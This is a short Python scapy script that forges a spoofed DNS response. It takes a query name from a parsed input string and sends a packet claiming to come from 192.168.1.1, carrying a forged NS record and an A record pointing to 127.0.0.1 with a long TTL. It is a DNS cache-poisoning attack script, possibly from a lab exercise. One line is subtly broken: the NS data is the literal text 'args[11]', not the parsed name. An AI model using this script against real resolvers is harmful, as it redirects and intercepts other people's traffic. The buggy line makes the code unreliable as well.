from scapy.all import DNS
from scapy.all import IP
from scapy.all import UDP
from scapy.all import DNSRR
from scapy.all import send
from scapy.all import DNSQR


def parse(s):
    args = s.split()

    pkt = (IP(src='192.168.1.1', dst='192.168.1.100')
           / UDP(sport=53, dport=4673)
           / DNS(id=20, qr=1, nscount=1, an=None, arcount=1,
                 qd=DNSQR(qname=args[11]),
                 ns=(DNSRR(rrname=args[11], type='NS', ttl=36000, rdata='args[11]')),
                 ar=(DNSRR(rrname=args[11], type="A", ttl=36000, rdata='127.0.0.1'))))
    send(pkt)
    print("### Packet sent ###")
